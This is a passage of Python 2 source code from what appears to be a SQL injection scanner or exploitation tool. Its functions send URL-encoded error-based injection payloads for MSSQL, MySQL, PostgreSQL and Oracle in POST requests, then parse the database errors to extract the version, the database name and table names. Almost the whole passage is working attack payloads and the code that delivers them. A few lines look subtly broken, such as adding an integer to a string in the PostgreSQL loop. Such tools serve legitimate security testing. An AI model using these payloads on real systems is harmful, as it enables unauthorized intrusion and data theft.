                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                if m:
                    current_user=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%'%20aNd%201=cast(version()%20AS%20int)%20aNd'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                    if m:
                        Database_Ver=m.group(1)
                    else:
                        Database_Ver=''
                        
            elif self.database_type=='oracle':
                                
                Exp_PostData="%s%s"%(ExpData,"%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||banner||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20sys.v_$version%20where%20rownum=1%29%29%20and%20%271%27=%271")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                if m:
                    current_user=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%%27or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||banner||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20sys.v_$version%20where%20rownum=1%29%29%20aNd'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                    if m:
                        Database_Ver=m.group(1)
                    else:
                        Database_Ver=''               
                        
                        
                        
                        
        except Exception,e:
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Post_Version :" + str(e))
                    
        return Database_Ver
        
        
        
        
        
    def SqlInj_Post_Database(self,PostData,sqlinjkey):
        DatabaseName=''
        ExpData=self.GetExpData(PostData,sqlinjkey)
        try:
            
            if self.database_type=='mssql':
                Exp_PostData="%s%s"%(ExpData,"'oR(DB_NAME()=0)--")
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                m = re.search(r'archar[^=]{1,5}\'(.{1,100})\'', content,re.I)
                if m:
                    DatabaseName=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%'oR(DB_NAME()=0)--")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'archar[^=]{1,5}\'(.{1,100})\'', content,re.I)
                    if m:
                        DatabaseName=m.group(1)
                    else:
                        DatabaseName=''
            elif self.database_type=='mysql':
                Exp_PostData="%s%s"%(ExpData,"%27and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29%20AND%20'1'='1")
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                m = re.search(r'Duplicate entry \'~\'(.{1,100})\'~', content,re.I)
                if m:
                    DatabaseName=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%%27and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28database%28%29+as+char%29%29%29%2C0x27%2C0x7e%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29%20AND%20'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'Duplicate entry \'~\'(.{1,100})\'~', content,re.I)
                    if m:
                        DatabaseName=m.group(1)
                    else:
                        DatabaseName=''
            elif self.database_type=='PostgreSQL':
                                
                Exp_PostData="%s%s"%(ExpData,"%27%20aNd%201=cast(current_database()%20AS%20int)--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                if m:
                    DatabaseName=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%'%20aNd%201=cast(current_database()%20AS%20int)%20aNd'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                    if m:
                        DatabaseName=m.group(1)
                    else:
                        DatabaseName=''
                        
                        
                        
                        
        
        
            elif self.database_type=='oracle':
                                
                Exp_PostData="%s%s"%(ExpData,"%27%20and%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||name||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20v$database%29%29--")
        
                #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    
                m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                if m:
                    DatabaseName=m.group(1)
                else:
                    Exp_PostData="%s%s"%(ExpData,"%%27%20and%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||name||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20v$database%29%29%20aNd'%'='")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                    if m:
                        DatabaseName=m.group(1)
                    else:
                        DatabaseName=''
        except Exception,e:
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Post_Database :" + str(e))
        return DatabaseName
          
          
                    
    '''get mysql,mssql,postgresql,oracle tables top 10'''
    def SqlInj_Post_Table(self,PostData,sqlinjkey,databasename):
        TableName=[]
        TableNum=0
        ExpData=self.GetExpData(PostData,sqlinjkey)
        try:
                
            if self.database_type=='mssql':
                Exp_PostData="%s%s"%(ExpData,"'and(select%20cast(count(1)%20as%20varchar(10))%2bchar(94)%20from[sysobjects]%20where%20xtype=char(85)%20and%20status!=0)=0--")
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
    #            print content
                m = re.search(r'archar[^=]{1,5} \'(\d{1,100})\^\'', content,re.I)
                if m:
                    TableNum=m.group(1)
                    print TableNum
    
        #                print TableNum
                    if int(TableNum)>0:
                        if int(TableNum)>10:
                            TableNum=10
                        for i in range(1,int(TableNum)+1):
                            
                            Exp_PostData="%s%s"%(ExpData,"'AnD(SelEcT%20Top%201%20cAsT(name%20As%20VarChAr(256))%20FroM(SeLeCt%20Top%20"+str(i)+"%20id,name%20fRom[sysobjects]WhEre%20xtype=ChAr(85)%20OrDer%20By%20id)%20t%20OrDer%20By%20id%20desc)=0--")
                            #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                            response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                            m = re.search(r'archar[^=]{1,5}\'(.+?)\'', content,re.I)
                            if m:
    #                            print m.group(1)
                                TableName.append(m.group(1))
                            else:
                                break
                else:
                    Exp_PostData="%s%s"%(ExpData,"%%27%20oR%20(sElEct%20cAst(coUNt(1)%20As%20varcHAR(10))%2bCHAR(94)%20fRoM[sysobjects]WhERe%20xtype=CHAR(85))=0--")
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    m = re.search(r'archar[^=]{1,5} \'(\d{1,100})\^\'', content,re.I)
                    if m:
                        TableNum=m.group(1)
                        if int(TableNum)>0:
                            if int(TableNum)>10:
                                TableNum=10
                            for i in range(1,int(TableNum)+1):
                                Exp_PostData="%s%s"%(ExpData,"%%27%20OR%20(SelEcT%20Top%201%20cAsT(name%20As%20VarChAr(256))%20FroM(SeLeCt%20Top%20"+str(i)+"%20id,name%20fRom[sysobjects]WhEre%20xtype=ChAr(85)%20OrDer%20By%20id)%20t%20OrDer%20By%20id%20desc)=0--")
                                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                                m = re.search(r'archar[^=]{1,5}\'(.{1,100})\'', content,re.I)
                                if m:
        #                            print m.group(1)
                                    TableName.append(m.group(1))
                                else:
                                    break
                
            
            elif self.database_type=='mysql':
                
                databasename='0x'+binascii.b2a_hex(databasename)
                
                Exp_PostData="%s%s"%(ExpData,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%280x7e%2C0x27%2Ccount%28table_name%29%2C0x27%2C0x7e%29+FROM+%60information_schema%60.tables+WHERE+table_schema%3D"+databasename+"%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                
                #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})  
                response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})   
                
                m=re.search(r'Duplicate entry \'~\'(\d{1,10})\'~',content,re.I)
                
                if m:
                    
                    TableNum=m.group(1)
                    
                    if int(TableNum)>0:
                        
                        if int(TableNum)>10:
                            
                            TableNum=10
                        
                        for i in range(1,int(TableNum+1)):
                            
                            Exp_PostData="%s%s"%(ExpData,"%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28table_name+as+char%29%29%29%2C0x27%2C0x7e%29+FROM+information_schema.tables+Where+table_schema%3D"+databasename+"+limit+"+str(i-1)+"%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%271%27%3D%271")
                            
                            #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})  
                            response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                            
                            m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                            
                            if m:
                                
                                TableName.append(m.group(1))
                            
                            else:
                                
                                break
                else:
                    
                    Exp_PostData="%s%s"%(ExpData,"%%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+concat%280x7e%2C0x27%2Ccount%28table_name%29%2C0x27%2C0x7e%29+FROM+%60information_schema%60.tables+WHERE+table_schema%3D"+databasename+"%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%27%%27%3D%27%")
                    
                    #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"}) 
                    response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    
                    m=re.search(r'Duplicate entry \'~\'(\d{1,10})\'~',content,re.I)
                    
                    if m:
                        TableNum=m.group(1)
                        
                        if int(TableNum)>0:
                            
                            if int(TableNum)>10:
                                
                                TableNum=10
                                
                        for i in range(1,int(TableNum+1)):
                            
                            Exp_PostData="%s%s"%(ExpData,"%%27+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28SELECT+distinct+concat%280x7e%2C0x27%2Cunhex%28Hex%28cast%28table_name+as+char%29%29%29%2C0x27%2C0x7e%29+FROM+information_schema.tables+Where+table_schema%3D"+databasename+"+limit+"+str(i-1)+"%2C1%29%29+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29+and+%27%%27%3D%27")
                            
                            #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})  
                            response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})

                            
                            m=re.search(r'Duplicate entry \'~\'(.{1,100})\'~',content,re.I)
                            if m:
                                
                                TableName.append(m.group(1))
                                
                            else:
                                
                                break
                            
            elif self.database_type=='PostgreSQL':
                
                TableNum=10
                
                for i in range(1,TableNum+1):
                             
                    Exp_PostData="%s%s"%(ExpData,"%27%20aNd%201=cast((select%20relname%20from%20pg_stat_user_tables%20limit%201%20offset%20"+i+")as%20int)--")
            
                    #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
        
                    m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                    
                    if m:
                        
                        TableName.append(m.group(1))
                        
                    else:
                        Exp_PostData="%s%s"%(ExpData,"%%27%20aNd%201=cast((select%20relname%20from%20pg_stat_user_tables%20limit%201%20offset%20"+i+")as%20int)and'%'='")
                        
                        #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                        response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                        
                        m = re.search(r'invalid input syntax for integer: "(.+?)"', content,re.I)
                        
                        if m:
                            
                            TableName.append(m.group(1))
                            
                        else:
                            
                            break
                        
                        
                        
            elif self.database_type=='oracle':
                
                TableNum=10
                
                for i in range(1,TableNum+1):
                             
                    Exp_PostData="%s%s"%(ExpData,"%27%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||data||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20%28select%20rownum%20as%20limit,table_name%20as%20data%20from%20user_tables%29%20where%20limit="+str(i)+"%29%29--")
            
                    #response,content=self.http.request(self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                    response,content=yx_httplib2_request(self.http,self.url,"POST",Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
        
                    m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                    if m:
                        TableName.append(m.group(1))
                    else:
                        Exp_PostData="%s%s"%(ExpData,"%%27%20or%201=utl_inaddr.get_host_address%28%28select%20chr%28126%29||chr%28126%29||chr%2839%29||chr%2839%29||chr%2839%29||data||chr%2839%29||chr%2839%29||chr%2839%29||chr%28126%29%20from%20%28select%20rownum%20as%20limit,table_name%20as%20data%20from%20user_tables%29%20where%20limit="+str(i)+"%29%29and'%'='")
                        
                        #response,content=self.http.request(self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                        response,content=yx_httplib2_request(self.http,self.url,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
                        
                        m = re.search(r'~~\'\'\'(.+?)\'\'\'~', content,re.I)
                        
                        if m:
                            
                            TableName.append(m.group(1))
                        
                        else:
                            
                            break
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.SqlInj_Post_Table :" + str(e))
        
        return TableName,len(TableName)
    
    
    

    
    '''function GetExpData get post data'''               
    def GetExpData(self,PostData,sqlinjkey):
        
        post_new_data=''
        
        post_data=''
        
        try:
            
            if PostData.find("&")>=0:
               
                postdata_list=PostData.split("&")
                key_v=''
               
                for name in postdata_list:
                    
                    name_list=name.split("=")
                    
                    if name_list[0]==sqlinjkey:
                        
                        key_v=name_list[0]+"="+name_list[1]
                        
                        continue
                    
                    else:
                        
                        post_new_data=post_new_data+name+"&"
                        
                post_data=post_new_data+key_v    
                
            else:
                
                post_data=PostData  
                          
        except Exception,e:
            
            logging.getLogger().error("sqlinjection_testscript.GetExpData :" + str(e))
            
        return post_data        
        